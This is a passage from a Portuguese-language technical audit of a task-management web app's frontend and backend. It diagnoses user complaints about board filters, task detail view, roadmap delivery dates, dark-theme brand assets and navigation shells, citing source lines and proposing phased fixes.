Opções de pessoa derivadas de `workspaceData.activities.flatMap(a => a.responsibles)` deduplicadas por `id`. Para ordenar os meses corretamente é preciso devolver `month.number` no workspace, que hoje só manda o nome: uma linha no `select` do backend. Simultaneamente: no `TasksView`, trocar o filtro por nome por filtro por `userId` alimentado por `members`, com avatar, e remover ou expor o `filterStatus` morto.

**Decisão de semântica que precisa ser tomada.** Hoje `a.month` é o **mês de planejamento** (a `Month` a que a atividade pertence), que pode ser diferente do mês do `dueDate`. Recomendo dois filtros distintos e rotulados: "Mês de planejamento" e "Entrega em" (intervalo de datas). A confusão entre os dois é exatamente o que produz a queixa do roadmap (4.3).

**Fase B (esforço M).** Um endpoint único de listagem com filtros compostos, que destrava esta queixa e mais duas:

```
GET /activities
  ?monthIds=a,b,c    ou  &from=2026-01-01&to=2026-03-31
  &quarter=Q1
  &assigneeIds=u1,u2      ("unassigned" como valor especial)
  &status=TODO,IN_PROGRESS
  &priorityMax=1
  &search=texto
  &overdue=true
  &includeSubtasks=false
  &groupBy=status|assignee|month
  &cursor=<id>&limit=50
```

O `where` do Prisma é simples e o `responsibles: { some: { userId: { in: [...] } } }` vira um `EXISTS` correlacionado que usa bem a PK `(userId, activityId)` do pivot (`board-tasks-api.md`, O1). O custo real está em migrar o front e em resolver a `position` sob filtro. Junto disso: ordenação fracionária e contrato `{ beforeId, afterId }`, mais os índices que faltam (`Activity(parentId)`, `Activity(dueDate)`, `ActivityResponsible(activityId)`, `ActivityLog(activityId, changedAt)`).

**Fase C, onde está o valor de verdade (esforço M).** Filtrar esconde; **agrupar dá visão**. Um seletor "Agrupar por: nenhum / pessoa / empresa / mês / prioridade" transforma o mesmo board em "carga por pessoa" (o gestor vê num relance quem está afogado e quem está ocioso), "andamento por empresa" e "o que fecha em cada mês". Os dados para todos esses agrupamentos já chegam no payload. É a resposta mais valiosa para essa queixa e fica barata depois que os filtros existirem (`board-front.md`, O3).

Complementos que valem: filtros salvos e compartilháveis por URL ("me manda o board do João em setembro" vira um link), WIP limit por coluna com destaque quando alguém passa de N em andamento, e marcação automática de cards parados há X dias usando o `ActivityLog` que já existe.

---

### 4.2 "Tarefa deveria abrir um card grande estilo Azure DevOps"

**Diagnóstico.** A tela de detalhe existe, é até bonita, e o problema não é visual: é que **ela é uma página de leitura com um modal de edição**, não um work item.

Clicar num card tira o usuário do board (navegação de página inteira, perde contexto, filtros e scroll). Chegando lá, quase nada é editável no lugar:

- **Status não é editável.** É um `Pill` de leitura pura (`work-flow/src/features/tasks/TaskDetailsView.vue:865-872`). O único jeito de mover a atividade de coluna é voltar ao board e arrastar. Ironicamente a **subtarefa** tem toggle direto (`:786-794`), só que binário TODO/DONE, sem acesso a IN_PROGRESS e IN_TESTING. Numa referência Azure DevOps, o campo State é o controle mais proeminente do work item.
- **Título, descrição, prioridade, data e responsáveis** exigem clicar no lápis (`:749-757`), abrir um `v-dialog` de 900px (`:1007-1236`), preencher e clicar em Salvar (`:1225-1233`).
- **Não tem histórico.** E o endpoint existe: `GET /backlog/activity/:activityId`, descrito como "Timeline de mudanças de uma atividade específica" (`workflow-api/src/backlog/backlog.controller.ts:20-27`). O front **não tem sequer o método**: `src/service/backlog/backlog-service.ts` só implementa `getBacklogByCompany`. O histórico existe, é mostrado como uma lista global sem contexto na aba Backlog do `TasksView` (`:470-507`), e some justamente dentro da tarefa, onde ele importa.
- **Não tem tempo apontado.** E a infra está pronta: o `time-tracking` já valida e grava `activityId` e já agrega `byActivity` (`workflow-api/src/time-tracking/time-tracking.service.ts:47-52,398-417`), e o `time-service.ts` do front já tipa `activityId`. Falta só o botão "Iniciar timer nesta tarefa" e o total "3h20 registradas" no painel.
- **Não tem os campos que fazem um work item ser um work item:** tipo (bug/feature/débito/suporte), estimativa, tags, dependências ("bloqueia / bloqueado por"), critérios de aceitação como checklist, e nem sequer "criado por" (não existe `createdById` em `Activity`, `workflow-api/prisma/schema.prisma:120-148`).
- **Não checa permissão.** O `TasksView` esconde "Nova Atividade" e passa `:readonly="!isWorkerRole"` para o board; o `TaskDetailsView` mostra **todos** os botões para qualquer um, e o clique falha com toast de erro porque o backend barra (`tasks-front.md`, P17). Não é vazamento, é ruído de UX e de suporte.

**O arquivo em si é parte do problema.** `TaskDetailsView.vue` tem 2.293 linhas e, dentro dele, **quatro `v-dialog`**: editar atividade (1007-1236), criar subtarefa (1238-1337), detalhe e edição de subtarefa (1339-1570) e subtarefa rápida da IA (1572-1613). Não é uma tela grande, são seis telas empilhadas num arquivo. Há duplicação literal de markup: o grid de anexos aparece três vezes quase idêntico (954-974, 1184-1204, 1395-1415 e 1504-1534) e o formulário de subtarefa aparece duas vezes (1251-1319 e 1447-1548). São ~676 linhas de CSS scoped com blocos repetidos. Qualquer ajuste visual precisa ser feito três vezes (`tasks-front.md`, seção 1.1).

**Desenho da solução.** O padrão certo é **painel sobre o board, não página**. Rota aninhada (`/board/:taskId` ou `/tasks/:month?task=:id`), drawer lateral ou modal grande, com o board vivo atrás. Fechar devolve o board exatamente como estava, o que mata metade da queixa 4.6 nesse fluxo.

Conteúdo do painel, em ordem de valor:

| Bloco | Estado hoje | O que precisa |
|---|---|---|
| Cabeçalho | título em `<h1>` estático (`:747`) | título editável inline, breadcrumb, status e responsáveis sempre visíveis |
| Status | `Pill` de leitura (`:866-871`) | segmented com os 4 estados chamando `patchActivityStatus`, que já emite realtime e grava backlog |
| Prioridade, data, responsáveis | leitura (`:903-945`) | controles inline que salvam no change |
| Descrição | `v-html` sem sanitização (`:758-762`) | TipTap (já está no projeto, usado em Notes) com autosave debounced, menção `@pessoa` (o backend já tem menções em comentários) e colar imagem |
| Subtarefas | lista com toggle binário | checkbox de 4 estados, criação rápida, título editável inline |
| Anexos | grid read-only, upload só no modal | dropzone na própria seção, preview, progresso, confirmação antes de apagar |
| Comentários | já existe e funciona | manter (`CommentsPanel` em `:979-984`) |
| Histórico | não existe no front | aba consumindo `GET /backlog/activity/:id`, esforço **P** |
| Tempo | não existe no front | total e botão de timer, esforço **P a M** |

**Do lado do backend**, para o card ficar realmente rico faltam duas coisas de fundo (`board-tasks-api.md`, O2):

1. Um `GET /activity/:id/detail` que devolva tudo numa resposta só. Hoje são 4 round-trips (`activity`, `backlog`, `comments`, `time`).
2. Generalizar o `ActivityLog`, que hoje registra **só transição de status** (`workflow-api/prisma/schema.prisma:177-188`), para `field / oldValue / newValue / actorId`. Isso é o que dá o "Discussion + History" do Azure DevOps e é a resposta para "quem mudou meu prazo?".

**Esforço:** P para histórico e tempo (endpoints prontos), M para os campos inline, G para o painel completo com componentização.

---

### 4.3 "O roadmap é fraco e não mostra as datas de entrega das atividades"

**Diagnóstico.** Esta é a queixa com o diagnóstico mais claro e o encadeamento mais brutal. Existem **três elos quebrados** na corrente, e consertar só um não produz nenhum efeito visível.

```
Activity.dueDate  (existe no banco: workflow-api/prisma/schema.prisma:129)
      |
      +--> Dashboard usa       (dashboard.service.ts:56)          OK
      +--> Notificacoes usam   (notifications.service.ts:94)      OK
      +--> Copiloto usa        (agent.service.ts:348)             OK
      |
      +--> Roadmap:
             GET /company/:id/roadmap
                 select: { status: true }          <<< ELO 1 (quarter.service.ts:91)
             front applyAnnualQuarterRoadmap
                 barra = mes inteiro (dia 1 ao fim)  <<< ELO 2 (RoadmapView.vue:463-464)
             modelo RoadmapEntry
                 sem activityId                    <<< ELO 3 (schema.prisma:598-612)
```

**Elo 1: a API descarta a data.** O `getRoadmap` seleciona **apenas `status`** das atividades:

```ts
// workflow-api/src/quarter/quarter.service.ts:89-94
activities: {
  where: { parentId: null },
  select: { status: true },      // só o status. nem dueDate, nem title, nem id
},
```

O que sai por mês é `{ id, name, number, totalTasks, completedTasks, progress }`. Ou seja, a API do roadmap anual devolve um **agregado de contagem**, não atividades.

**Elo 2: a barra é o mês, não a atividade.** Na falta de qualquer data, o front sintetiza barras artificiais do dia 1 ao último dia do mês:

```ts
// work-flow/src/features/roadmap/RoadmapView.vue:457-478
const start = dateKey(roadmapStart.getFullYear(), monthNumber - 1, 1)
const end = dateKey(roadmapStart.getFullYear(), monthNumber - 1, new Date(...).getDate())
```

Não existe nenhum caminho no código que desenhe uma atividade individual. A "timeline anual" é um gráfico de 12 barras de progresso agrupadas em 4 faixas, disfarçado de Gantt. O mapper que **saberia** ler datas reais existe e está morto: `mapAnnualItem` (`RoadmapView.vue:534-552`) só roda no branch `lanes/items`, inalcançável enquanto a API devolver `quarters`.

**Elo 3: o modelo não tem onde guardar.** `RoadmapEntry` não tem `activityId` (`workflow-api/prisma/schema.prisma:598-612`). Compare com `Event`, que **tem** `activityId` e relação com `Activity` (`schema.prisma:264-285`): o calendário sabe apontar para uma tarefa, o roadmap não. Existe até uma categoria `delivery` no enum `RoadmapCategory`, e a UI nem oferece criar entry dessa categoria.

**Divergência entre relatórios.** `roadmap-api.md` (P5) afirma que "a queixa 4 tem causa raiz única e exata: `select: { status: true }`". `roadmap-front.md` (P-01) afirma que são três rupturas independentes. **Minha leitura: `roadmap-front.md` é mais provavelmente certo sobre o efeito prático.** Corrigir só o `select` não muda nada na tela, porque o front continua sintetizando barras de mês e ignorando o payload novo. O mínimo para o dono ver diferença são os elos 1 e 2 juntos. O elo 3 só é necessário para o modo "calendários mensais", onde o dia 20/08 hoje fica em branco.

**A tela tem outros seis problemas que somam para a sensação de "fraco".**

1. **Não dá para editar nem apagar item de agenda.** Grep por `updateEntry`, `removeEntry`, `updateFocus`, `updateMonth` e `removeMonth` no `RoadmapView.vue` retorna **zero ocorrências**, e os métodos **existem** no service do front (`work-flow/src/service/roadmap/roadmap-monthly-service.ts:81,86,96,136,141`). O usuário digita a data errada numa anotação e o item fica no calendário para sempre (`roadmap-front.md`, P-02).
2. **Só dá para criar item da categoria "Nota".** A legenda mostra 6 categorias (Marco, Reunião, Entrega, Gravação, Nota, Risco), e o único formulário da tela sempre grava `category: 'note'`. O `addEntry` genérico existe no service e nunca é chamado (`roadmap-front.md`, P-05).
3. **Os dias do calendário são botões que não fazem nada.** `<button :disabled="!cell.day">` sem `@click` (`RoadmapView.vue:1382-1400`). O usuário vê um dia colorido, entende que tem algo ali, clica e nada acontece. De brinde são ~30 tab stops inúteis por card, ~360 no ano.
4. **Marcos e reviews são inatingíveis pela interface.** A timeline tem uma faixa inteira dedicada a "Marcos & reviews" (`RoadmapView.vue:1964-2007`), com pins, ícones e estados de seleção. Ela nunca aparece, porque a API expõe `POST/PATCH/DELETE /company/:companyId/roadmap/milestones` (`workflow-api/src/quarter/quarter.controller.ts:55-90`) e o front **não tem service para isso**. É backend 100% implementado e 0% acessível.
5. **A mensagem de erro mente.** Quando a API cai, o catch zera `monthlyPlans` e o usuário vê "Nenhum mês cadastrado para 2026" com o texto "A API respondeu sem meses para a empresa ativa" (`RoadmapView.vue:665-671,1305-1315`). Isso é falso: a API não respondeu. O usuário conclui que perdeu os dados. E o branch de "sucesso mas vazio" é código morto, porque `getYear` **sempre** devolve 12 meses (`workflow-api/src/roadmap/roadmap.service.ts:67-98`).
6. **O seletor "Mês para exportar" não afeta o PDF.** O fluxo feliz é o do servidor e ele só recebe o ano (`RoadmapView.vue:1052`; `workflow-api/src/export/export.controller.ts:40`). O mês escolhido só tem efeito no fallback de `window.print()`, que só roda se o servidor falhar.
7. **A timeline anual é uma tabela de quarters fingindo ser Gantt.** As colunas dizem "Área", "Responsável" e "Status", e mostram `Q1`, `Empresa` (placeholder hardcoded em `RoadmapView.vue:415-455`) e um status derivado por contagem. O eixo horizontal **já é** Q1 a Q4, então a tela mostra trimestre em duas dimensões ao mesmo tempo e o resultado é uma matriz diagonal com 75% de área vazia.
8. **Não existe seletor de ano.** `const roadmapYear = new Date().getFullYear()` é constante, não `ref` (`RoadmapView.vue:136-138`). Em outubro não dá para planejar o ano seguinte; em janeiro não dá para consultar o anterior. E aqui a queixa encosta no Problema 5: no modo mensal o seletor funcionaria hoje mesmo (`RoadmapMonth` tem `year`), mas na timeline seria mentira até `Month` ganhar ano.

Ah, e uma correção de documentação: `src/CLAUDE.md` afirma que o roadmap tem "Timeline anual + calendários mensais mockados". **Isso está desatualizado**: a varredura não encontrou nenhum array de mock; o que sobrou da era mock é CSS órfão e alguns computeds sem consumidor (`roadmap-front.md`, seção 3).

**Desenho da solução.**

**Fase A, mínimo visível (esforço M).**
1. API: trocar `select: { status: true }` por `select: { id, title, status, dueDate, priorityNumber, responsibles }` e devolver um array `activities` por mês. Melhor ainda: um array `items` top-level já no shape `{ id, monthId, title, start, end, dueDate, progress, status, assignees }`.
2. Front: `applyAnnualQuarterRoadmap` passa a gerar, além das barras de mês, **pins de entrega** posicionados por `dueDate` (reusando o `markerStyle` que já existe), com toggle "ver por mês / ver por atividade". Clicar num pin abre o card grande da tarefa (a mesma tela de 4.2).
3. Junto: wire dos métodos de CRUD que já existem no service (item 1 da lista acima), formulário de categoria (item 2), `@click` nos dias (item 3), `loadError` que não zera os dados (item 5), e o service de milestones (item 4). São todos baratos e cada um remove um "isso está quebrado".

**Fase B, o roadmap que se preenche sozinho (esforço G).** Adicionar `activityId String?` em `RoadmapEntry` e um sync (job ou gatilho no `activity.service` ao definir ou alterar `dueDate`) que cria e atualiza uma entry `category: 'delivery'`, `source: 'activity'` no mês correspondente. O usuário continua podendo adicionar itens manuais (reuniões, riscos, gravações), com filtro "só entregas" e "só manual".

Este é o ponto que muda a natureza da feature. **Hoje o roadmap é um segundo lugar onde o usuário digita as mesmas informações que já estão nas tarefas. Ninguém mantém dois lugares atualizados, e é exatamente por isso que ele está fraco.** Um roadmap que se preenche a partir das entregas cadastradas passa de enfeite a fonte de verdade.

**Fase C, o eixo vertical de verdade (esforço G).** Trocar "lane = quarter" por "lane = responsável" (que resolve também metade da queixa 4.1) ou "lane = épico". Barras com início e fim reais, pins de marco, linha vertical do "hoje", atrasos em vermelho (o cálculo de atrasado já existe em `dashboard.service.ts:99-100`), e arrastar a barra muda o `dueDate` com salvamento otimista, que é a queixa 4.7 aplicada ao roadmap.

**Fase D, o roadmap como peça comercial (esforço M).** `POST /share/roadmap/:year` e `/public/roadmap/:token` já existem e funcionam (`workflow-api/src/share/share.service.ts:104-109`, com `expiresAt` já suportado em `:125`). Hoje o `PublicRoadmapView` é uma lista crua que mostra "Vazio" e "Sem título" nos meses não preenchidos (`work-flow/src/features/public/PublicRoadmapView.vue:44-51`), ou seja, passa impressão de produto abandonado justamente na tela que vai para o cliente. Filtrar meses vazios, colocar logo e nome da empresa, badges de entregue / em andamento / planejado, contador de entregas do ano, marca d'água discreta "feito com Workflow" e OG tags para o link ficar bonito colado no WhatsApp. Isso é aquisição orgânica de graça.

---

### 4.4 "A marca fica esquisita no tema escuro"

**Diagnóstico. Não é percepção, é defeito mensurável.** A análise decodificou os PNGs pixel a pixel (`design-system.md`, P1 e P2).

**Causa 1: o alpha dos PNGs está sujo.** Todos os arquivos da marca têm pixels totalmente transparentes carregando RGB **creme** `#FDF3E9`, não RGB neutro nem premultiplicado:

```
icone-rosto-detalhes.png    cantos rgba: (253,243,233,0) (254,243,234,0) ...
icone-cabeca-circulo.png    cantos rgba: (253,241,233,0) ...
mascote-3d-sem-sombra.png   cantos rgba: (253,242,233,0) ...
icone.png (Stack Roads)     cantos rgba: (0,0,0,0)   <- este esta correto
```

O canal alpha é uma máscara aplicada sobre um fundo creme, sem *unmatting*. Em `icone-rosto-detalhes.png` (126x125), **15,9% dos pixels são resíduo creme puro** (2.500 de 15.750). A scanline na altura da sobrancelha mostra 4 px de creme com alpha crescente antes de chegar no traço preto. Em 24px de exibição, isso é ~1px de contorno branco brilhante em volta de cada traço. E há pixels creme com alpha até 74 **sem nenhum traço adjacente**, que são restos fantasma do contorno da xícara apagada: sobre o dark eles aparecem como riscos claros flutuando ao redor do rosto.

No tema claro isso some, porque creme sobre branco não se distingue. Por isso a marca "fica esquisita só no dark".

**Causa 2: o traço não tem contraste no dark.** As cores dominantes contra `--surface-2` (`#17171A`):

| Cor | Pixels | Contraste no dark | Contraste no light |
|---|---|---|---|
| `#481800` (bigode, sobrancelha) | 1.457 | **1,20** | 14,93 |
| `#000000` (pupilas, contorno) | 640 | **1,17** | 21,00 |
| `#E87028` (nariz) | 292 | 5,78 | 3,10 |

Só o nariz laranja é visível. **A marca no dark é literalmente uma bolinha laranja com halo branco em volta.** Não existe variante clara do asset, nem `filter`, nem troca de `src` por tema: `BrandMark.vue:23` renderiza o mesmo `<img>` nos dois temas. O mesmo vale para o logo Stack Roads (`icone.png`), cuja cor dominante navy `#081828` tem contraste **1,00:1** contra o fundo escuro.

**Causa 3: não existe sistema de marca.** Três marcas convivendo como se fossem a mesma coisa (o logo Stack Roads com estrada e seta, o mascote xícara dentro de círculo verde, e só os traços do rosto do mascote), **zero arquivos `.svg` no repositório**, nenhum wordmark (o nome "Workflow" nunca é tipografado como elemento de marca, aparece só no `title` de tooltip em `BrandMark.vue:19`), e nenhuma regra de área de respiro ou tamanho mínimo. Pior: `CommandShell.vue:69-70` renderiza `<BrandMark />` (rosto sem xícara) imediatamente seguido de `<CompanySwitcher variant="compact" />` (xícara dentro do círculo verde), ou seja **duas versões diferentes do mesmo mascote a 9px de distância, em toda tela do produto**.

**Causa 4, que dói mais do que parece: o mesmo PNG é o avatar de todas as empresas.** Em 7 pontos distintos o "avatar da empresa" é `src="/icone-cabeca-circulo.png"` hardcoded (`CompanySwitcher.vue:79,94,102,125`, `BoardView.vue:325`, `CompanyUsersView.vue:223,283`). No diálogo "Trocar Empresa", todas as N linhas mostram o mesmo mascote. No board, cada card carrega um chip com esse mascote a 18px ao lado do nome da empresa: informação zero, ruído visual em cada card. E o tipo `Company` nem tem campo de logo. Para quem opera 3 ou mais clientes, isso é a diferença entre escanear o board e ler cada linha.

**Enquanto isso, o tema claro está objetivamente pior que o escuro.** As cinco cores de status são **idênticas nos dois temas** (`work-flow/src/plugins/tokens.ts:42-50` e `:67-75`) e, como texto sobre branco, **todas falham WCAG AA**: `--status-prog` 2,35:1, `--status-done` 2,62:1, `--status-todo` 3,24:1, `--status-test` 3,33:1, `--status-block` 3,76:1. E `--text-2` e `--text-3` são literalmente o mesmo valor no light (`rgba(11,11,12,0.70)`, `tokens.ts:64-66`), colapsando a hierarquia de texto. E a diferença entre o fundo da página e a superfície de card no light é **1,027:1**, com a borda que deveria separá-los em 1,19:1: no tema claro não existe separação visual entre página e card.

**Bônus, e não é pequeno: o "aumento de fonte" não aumenta fonte nenhuma.** `applyFontScale` faz `root.style.fontSize = 16 * scale`, o que só afeta `rem` (`tokens.ts:145-151`), mas `reset.css:12` define `body { font-size: 13px }` absoluto, cortando a herança, e no `src/` inteiro existem **810 declarações de `font-size` em px contra 3 em `rem`** (todas em `DownloadView.vue`). A copy da tela de Settings promete "Deixa todo o texto do app maior". Um usuário 50+ que ativa 1.3x não vê **nenhuma** mudança. Isso é uma promessa explícita de acessibilidade que não é entregue, e é o público-alvo declarado do programa didático.

**Desenho da solução.**

**Onda 1, higiene visível (esforço P cada, tudo em um dia).**
- Aplicar unmatting nos PNGs (`RGB_out = (RGB_in - bg*(1-a)) / a`) e reexportar. Isso sozinho mata o halo.
- Script inline de 5 linhas no `<head>` lendo o localStorage e setando `data-theme` e `background` no `html`, para acabar com o flash branco em todo boot de tema escuro (`design-system.md`, P14). Mais `<meta name="theme-color">`.
- Apontar o favicon para o `public/favicon.ico` que **já existe e está correto** (3 tamanhos, 15 KB) e hoje é ignorado porque o `<link rel="icon">` explícito aponta para um PNG de 45 KB e 179x176 não quadrado (`index.html:5-6`).
- Deletar os ~429 KB de assets órfãos e duplicados em `public/` (dois pares byte a byte idênticos, confirmados por md5).
- Trocar os dois travessões da copy de `index.html:8,10`, que aparecem em resultado de busca e em preview de link no WhatsApp e no LinkedIn.

**Onda 2, marca de verdade (esforço M).** `src/assets/brand/` dentro do Vite (com hash e inline automático de SVG pequeno) com `mark.svg`, `mark-mono.svg`, `wordmark.svg` e lockups. `BrandMark` vira SVG inline com `fill: var(--brand-ink)`, o que resolve o contraste sem manter dois arquivos, elimina o halo por construção (vetor não tem franja) e dá nitidez em qualquer DPR. Mais um `docs/brand.md` com grade, tamanho mínimo, área de respiro e fundos permitidos.

Decisão de arquitetura de marca que precisa ser tomada (seção 7, decisão 11): **recomendo símbolo próprio do Workflow com "by Stack Roads" no rodapé**, e o mascote virando ilustração de estados vazios, onboarding e login, nunca logo. Mascote é ótimo em 148px e péssimo em 16px monocromático: a versão atual tem detalhes de 1px que somem em 18px.

Detalhe divertido e real: o hover atual do `BrandMark` rotaciona a marca `-8deg` (`BrandMark.vue:48-50`). É exatamente a regra que nenhum manual de marca permite. Troque por lift ou brilho no container.

**Onda 3, avatar de empresa (esforço M).** `ui/CompanyAvatar.vue`: se `company.logoUrl` existe, usa; senão gera monograma sobre cor derivada deterministicamente de `hash(company.id)` numa paleta de 12 tons validados nos dois temas. Quadrado com `--radius-sm`, reservando círculo para pessoas. Upload de logo por empresa (o backend já tem padrão de upload de imagem). **Bônus de receita:** logo do cliente no board público e nos PDFs de roadmap é feature de plano pago clássica, white-label leve.

**Onda 4, fundação de cor e escala (esforço M a G).** Duas rampas por token de status (`--status-x` para superfície, `--status-x-fg` para texto, com valor 600/700 no light e 300/400 no dark); rampa de superfície própria para o light com elevação por sombra em vez de clareamento; `--border` do light para ~0,12; escala tipográfica fechada em 7 degraus com `calc(N * var(--font-scale))`, que é o que faz o aumento de fonte finalmente funcionar; e um teste de contraste em CI que percorre `themeTokens` e falha se qualquer par declarado ficar abaixo de 4,5:1 (o cálculo cabe em 20 linhas). Sem esse último, a deriva volta em 3 meses.

---

### 4.5 "O estilo 2 (FocusShell) não funciona bem"

**Veredito: os problemas são reais, e são cinco empilhados.** Não é impressão nem questão de gosto (`shells-nav.md`, seção 4).

**1. Trocar de shell remove destinos do produto.** Esta é a descoberta mais dura da área. Cada superfície de navegação é uma lista hardcoded diferente. Quem escolhe o estilo 2 perde do menu:

| Destino | NavList (Command) | FocusShell rail | CanvasShell |
|---|---|---|---|
| QR Codes | sim (`NavList.vue:66`) | **não** | **não** |
| Bug reports | sim (`NavList.vue:61`) | **não** | **não** |
| Meu tempo (`/time`) | sim (`NavList.vue:96`) | **não** | **não** |
| Relatório do trimestre | sim | só dentro de `/tasks` | popover |
| Usuários | sim, com gate | sim, **sem gate** | **não** |

E a command palette, que seria a saída ("no estilo 2 falta menu, mas tem Cmd+K"), **não conhece metade do produto**: faltam Board, Tarefas, Notas, Calendário, Meu tempo, QR Codes e Bug reports (`work-flow/src/components/CommandPalette.vue:99-125`). Digitar "board" na paleta não leva ao Board.

Concreto: o `TimerWidget` está no topbar dos três shells, mas o link para a tela `/time` não existe no estilo 2. O usuário inicia o timer e não tem como chegar ao histórico.

**Causa estrutural: são nove listas de navegação hardcoded e divergentes**, mais dois mapas paralelos de rótulo de rota, ou seja **onze lugares para editar quando entra uma rota nova** (`shells-nav.md`, P18). O `src/CLAUDE.md:185` até documenta o ritual, o que confirma que a duplicação é conhecida e aceita. A divergência já aconteceu em 4 destinos.

**2. A coluna de contexto de 240px é redundante em quase todas as rotas.** Fora de `/tasks` e `/relatorio`, ela mostra "Dashboard, Board, Roadmap, Tarefas, Notas, Calendário", **todos já presentes no rail ao lado, a 56px de distância** (`FocusShell.vue:168-209` versus `:40-58`). E não é nem uma lista de dados: é markup literal repetido botão a botão. Ou seja, o estilo 2 gasta 296px de chrome permanente (contra 248px do CommandShell) para mostrar **menos** navegação. A coluna também não é colapsável: não existe botão de recolher, atalho nem persistência.

**3. Quando a coluna teria valor, ela falha.** A árvore de trimestres nasce fechada em refresh e em deep link:

```ts
// work-flow/src/core/components/shells/FocusShell.vue:71-85
watch(() => route.path, (p) => {          // única dependência
  const q = quarters.value.find(...)      // quarters ainda vazio no primeiro tick
  if (q) openQuarter.value = q.id
}, { immediate: true })
```

`quarters` vem de Vue Query, então é `[]` no primeiro tick. O watch roda `immediate`, não acha nada, e **nunca mais roda**. Funciona quando você navega de outra tela na mesma sessão (cache quente) e quebra no F5 e no link de notificação. Ou seja: funciona no teste e quebra no uso real.

**4. Oferece um item proibido.** `/company-users` está no rail sem nenhum conceito de papel no arquivo (`FocusShell.vue:51-56`), e a rota exige `requiredRole: 'ADMIN'`. Um WORKER clica, é jogado de volta para o Dashboard com o toast "Você não tem acesso a essa página nesta empresa". Toda vez.

**Aqui há um par de bugs espelhados que vale entender junto.** No CommandShell acontece o contrário: "Usuários" e "Bug reports" **nunca aparecem**, mesmo para um ADMIN legítimo. O `NavList` gateia por `workspaceStore.activeRole`, e esse campo só é escrito no `setActiveCompany` **quando `this.companies` já está populado**; o `CompanySwitcher` mantém a lista num `ref` local próprio e nunca popula `workspace.companies`, e o `fetchWorkspace` só chama `setActiveCompany` quando `activeCompanyId` é falsy, o que nunca acontece para quem já usou o app (`shells-nav.md`, P1). Resultado: `activeRole === null` o tempo todo. Enquanto isso o guard de rota lê o papel do **JWT** e deixa entrar. Duas fontes de verdade para o mesmo papel: uma esconde o link, a outra libera a rota.

**5. Acabamento que soma.** A `slim-top` tem 44px de altura e os filhos têm exatamente 44px, ou seja ocupam 100% da barra sem folga nenhuma, enquanto no CommandShell a mesma fileira vive numa topbar de 56px (`FocusShell.vue:501-509`). O `.rail-nav` não tem `overflow` nem `min-height: 0`, e o `.focus-shell` tem `overflow: hidden`: em janela de 500px de altura, em split-screen, ou com zoom de 150%, o rodapé do rail (Configurações e Sair) é **empurrado para fora da tela sem barra de rolagem**. O `.rail-indicator` é posicionado por `left: -10px`, dependendo de o botão ter exatamente 36px num rail de exatamente 56px.

E aparece **"Forge"**, um nome morto, como título de página. `currentLabel` cai no fallback `'Forge'` (`FocusShell.vue:66-69`) em `/settings`, `/qr`, `/time`, `/bug-reports` e `/repos`. Entrar em Configurações no estilo 2 mostra "Forge" no topo. Cheiro de produto abandonado.

**6. E com o modo XP ligado, o estilo 2 perde a troca de empresa.** O XP esconde `.sidebar`, `.rail` e `.context` (`xp.css:163-166`). No CommandShell isso é indolor, porque BrandMark, CompanySwitcher, CmdK e UserMenu vivem na topbar. No FocusShell esses controles vivem justamente no rail e na coluna, e o Menu Iniciar cobre Configurações e Logoff mas **não tem troca de empresa**. Num SaaS multi-empresa, ficar sem trocar de empresa pela interface é bloqueio de fluxo.

**7. Nenhum item de navegação do FocusShell e do CanvasShell é um link.** São `<button @click="router.push(...)">` (`FocusShell.vue:101-111`). Consequência comprovada: **Ctrl+clique não abre em nova aba**. O fluxo básico "abro o Board numa aba e o Roadmap noutra" é impossível no estilo 2. Não há "copiar endereço do link", não há `aria-current="page"`, e não há `<nav aria-label>` em nenhum dos três shells. O CommandShell não tem esse problema porque o `NavList` usa `v-list-item :to`.

**8. E nenhum dos três shells é responsivo.** `grep -c '@media'` nos três: **0, 0, 0**. Grid fixo e `height: 100vh` (não `100dvh`). Num iPhone de 390px no estilo 2, `56 + 240 = 296px` de chrome deixam **94px** para o conteúdo, com `overflow: hidden` impedindo recuperação. O irônico é que **as views são responsivas**: existem `@media` em `DashboardView`, `BoardView`, `CalendarView`, `QrCodesView`, `CompanyUsersView` e mais 15 arquivos. O trabalho de responsividade foi feito no conteúdo e nunca no esqueleto.

**Desenho da solução.**

**A raiz é uma só: registry única de navegação (esforço M).** Um `src/core/navigation/registry.ts` com um array tipado:

```ts
export interface NavDestination {
  id: string
  to: string | ((ctx: NavContext) => string)
  label: string
  shortLabel?: string
  icon: LucideIcon
  section: 'Trabalho' | 'Pessoal' | 'Sistema'
  role?: 'WORKER' | 'ADMIN'
  featureFlag?: keyof typeof flags
  surfaces: Array<'sidebar' | 'rail' | 'tabs' | 'dock' | 'palette' | 'mobile-bar' | 'xp-start'>
  keywords?: string
  glossary?: string
}
```

Cada shell consome `useNavigation('rail')`, `useNavigation('tabs')` e assim por diante. A paleta consome `'palette'`. Os mapas de rótulo viram `route.meta.title` derivado da mesma registry, o que mata o "Forge". Isso resolve de uma vez os itens 1, 4 e 5, e o gate de papel passa a ser aplicado num lugar só, usando **a mesma função do guard de rota** (JWT mais empresa ativa), extraída num `useActiveRole()`, o que mata o bug espelhado do `activeRole` null.

**O que salva o estilo 2 e o torna melhor que o estilo 1 (esforço G).** A coluna de contexto precisa receber um `<slot name="context">` que cada view preenche:

| Rota | O que a coluna mostraria |
|---|---|
| `/board` | filtros persistentes: pessoa, mês, status, prioridade (**a queixa 4.1 resolvida dentro da navegação**, sem poluir a toolbar) |
| `/roadmap` | anos, trimestres, tipos de evento, filtro por responsável, alternância timeline/mensal |
| `/tasks/:mês` | a árvore atual mais contadores por status |
| `/notes` | pastas, tags, notas recentes |
| `/qr` | pastas de QR (a feature já tem pastas, hoje só na toolbar) |
| `/variables` | filtro por tipo e busca |

Com botão de recolher persistido em `uiStore` e a coluna sumindo quando a rota não provê contexto. Esse é o modelo mental do Linear que a própria spec cita como referência: rail é a aplicação, coluna é o recorte dentro da aplicação atual. **Feito isso, o estilo 2 passa a ser o shell de trabalho focado, e não uma versão pior do estilo 1 com mais chrome.**

**Correções baratas para já (esforço P cada):** `<RouterLink>` no lugar de `<button @click>`, `<nav aria-label>` e `aria-current`, skip link no `AppShell`, `CompanySwitcher` e `UserMenu` movidos para a `slim-top` (a única barra que sobrevive ao XP e hoje está semivazia à esquerda), `overflow-y: auto` e `min-height: 0` no `.rail-nav`, `slim-top` para 52px, comandos de navegação faltantes na paleta, e `padding-bottom: 84px` no `.main` do CanvasShell, cujo dock flutuante hoje cobre os últimos ~70px do conteúdo.

